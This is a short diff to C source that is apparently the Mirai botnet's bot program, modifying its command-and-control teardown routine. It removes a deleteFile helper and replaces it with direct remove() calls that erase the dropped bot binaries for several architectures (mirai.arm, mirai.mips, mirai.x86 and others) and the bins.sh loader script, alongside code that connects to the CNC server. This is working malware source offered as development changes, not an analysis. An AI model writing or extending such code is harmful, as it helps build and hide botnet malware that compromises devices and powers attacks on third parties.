@@ -30,7 +30,6 @@ static void establish_connection(void);
 static void teardown_connection(void);
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
-static int deleteFile(const char*);
 
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
@@ -406,28 +405,23 @@ static void establish_connection(void)
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
 }
 
-static int deleteFile(const char* fileName)
-{
-    return !(remove(fileName));
-}
-
 static void teardown_connection(void)
 {
 #ifdef DEBUG
     printf("[main] Tearing down connection to CNC!\n");
 #endif
     
-    deleteFile("mirai.arm");
-    deleteFile("mirai.arm5n");
-    deleteFile("mirai.arm7");
-    deleteFile("mirai.m68k");
-    deleteFile("mirai.mips");
-    deleteFile("mirai.mpsl");
-    deleteFile("mirai.ppc");
-    deleteFile("mirai.sh4");
-    deleteFile("mirai.spc");
-    deleteFile("mirai.x86");
-    deleteFile("bins.sh");
+    remove("mirai.arm");
+    remove("mirai.arm5n");
+    remove("mirai.arm7");
+    remove("mirai.m68k");
+    remove("mirai.mips");
+    remove("mirai.mpsl");
+    remove("mirai.ppc");
+    remove("mirai.sh4");
+    remove("mirai.spc");
+    remove("mirai.x86");
+    remove("bins.sh");
 
     if (fd_serv != -1)
         close(fd_serv);
